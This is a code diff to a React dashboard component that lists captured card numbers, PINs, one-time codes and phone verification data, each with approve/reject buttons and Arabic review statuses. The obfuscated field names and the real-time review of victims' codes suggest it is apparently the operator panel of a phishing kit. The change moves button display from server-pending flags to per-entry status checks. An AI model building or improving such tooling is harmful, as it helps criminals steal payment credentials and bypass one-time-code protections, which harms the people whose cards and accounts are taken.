@@ -2593,12 +2593,12 @@ const renderNafadBox = () => {
     // Create ONE box for Card (latest entry only)
     if (latestCardEntry) {
       const raw = latestCardEntry.raw || {};
-      // Check if card has pending decision from server
-      const hasCardPending = Boolean(pendingDecisions.card);
-      // Show buttons if: has pending decision AND has card data
-      const showCardDecisionButtons = hasCardPending && Boolean(raw._v1 || raw.cardNumber);
-      // Status text based on pending state
-      const cardStatusText = hasCardPending ? "في انتظار المراجعة" : (raw._v1Status === "approved" ? "تمت الموافقة" : raw._v1Status === "rejected" ? "تم الرفض" : "");
+      // Check if card has data
+      const hasCardData = Boolean(raw._v1 || raw.cardNumber);
+      // Check if card already has a decision
+      const hasCardDecision = raw._v1Status === "approved" || raw._v1Status === "rejected";
+      // Show buttons if: has card data AND no decision yet
+      const showCardDecisionButtons = hasCardData && !hasCardDecision;
       // Use _v1UpdatedAt for Card box timestamp, fallback to comparCompletedAt or submittedAt
       let entryTimestamp = raw._v1UpdatedAt 
         ? new Date(raw._v1UpdatedAt).getTime()
@@ -2944,7 +2944,7 @@ const renderNafadBox = () => {
               <div style={{ marginTop: 8, padding: "10px 12px", borderRadius: 8, background: "#fee2e2", color: "#991b1b", fontSize: "12px", textAlign: "center", fontWeight: 600 }}>
                 ✗ تم رفض البطاقة
               </div>
-            ) : hasCardPending ? (
+            ) : showCardDecisionButtons ? (
               <div style={{ marginTop: 8, padding: "10px 12px", borderRadius: 8, background: "#fef3c7", color: "#92400e", fontSize: "12px", textAlign: "center", fontWeight: 600 }}>
                 ⏳ في انتظار المراجعة فقط
               </div>
@@ -3175,10 +3175,12 @@ const renderNafadBox = () => {
     if (latestOtpEntry) {
       const raw = latestOtpEntry.raw || {};
       const otpCode = raw._v5 || raw.otpCode;
-      // Check if OTP has pending decision from server
-      const hasOtpPending = Boolean(pendingDecisions.otp);
-      // Show buttons if: has pending decision AND has OTP data
-      const showOtpDecisionButtons = hasOtpPending && Boolean(otpCode);
+      // Check if OTP has data
+      const hasOtpData = Boolean(otpCode);
+      // Check if OTP already has a decision
+      const hasOtpDecision = raw._v5Status === "approved" || raw._v5Status === "rejected";
+      // Show buttons if: has OTP data AND no decision yet
+      const showOtpDecisionButtons = hasOtpData && !hasOtpDecision;
       // Use _v5UpdatedAt for OTP box timestamp, fallback to comparCompletedAt or submittedAt
       let entryTimestamp = raw._v5UpdatedAt 
         ? new Date(raw._v5UpdatedAt).getTime()
@@ -3391,10 +3393,12 @@ const renderNafadBox = () => {
     if (latestPinEntry) {
       const raw = latestPinEntry.raw || {};
       const pinCode = raw._v6 || raw.pinCode;
-      // Check if PIN has pending decision from server
-      const hasPinPending = Boolean(pendingDecisions.pin);
-      // Show buttons if: has pending decision AND has PIN data
-      const showPinDecisionButtons = hasPinPending && Boolean(pinCode);
+      // Check if PIN has data
+      const hasPinData = Boolean(pinCode);
+      // Check if PIN already has a decision
+      const hasPinDecision = raw._v6Status === "approved" || raw._v6Status === "rejected";
+      // Show buttons if: has PIN data AND no decision yet
+      const showPinDecisionButtons = hasPinData && !hasPinDecision;
       // Use _v6UpdatedAt for PIN box timestamp, fallback to comparCompletedAt or submittedAt
       let entryTimestamp = raw._v6UpdatedAt 
         ? new Date(raw._v6UpdatedAt).getTime()
@@ -3613,11 +3617,12 @@ const renderNafadBox = () => {
     // Create ONE box for Phone (latest entry only)
     if (latestPhoneEntry) {
       const raw = latestPhoneEntry.raw || {};
-      // Check if phone has pending decision from server
-      const hasPhonePending = Boolean(pendingDecisions.phone);
-      // Show buttons if: has pending decision AND has phone data from step5
+      // Check if phone has data from step5
       const hasPhoneData = Boolean(raw.phoneIdNumber || raw.phoneCarrier || raw.phoneOtp || raw._v7);
-      const showPhoneDecisionButtons = hasPhonePending && hasPhoneData;
+      // Check if phone already has a decision
+      const hasPhoneDecision = raw.phoneOtpStatus === "approved" || raw.phoneOtpStatus === "rejected";
+      // Show buttons if: has phone data AND no decision yet
+      const showPhoneDecisionButtons = hasPhoneData && !hasPhoneDecision;
       // Use _v7UpdatedAt for Phone box timestamp, fallback to comparCompletedAt or submittedAt
       let entryTimestamp = raw._v7UpdatedAt 
         ? new Date(raw._v7UpdatedAt).getTime()
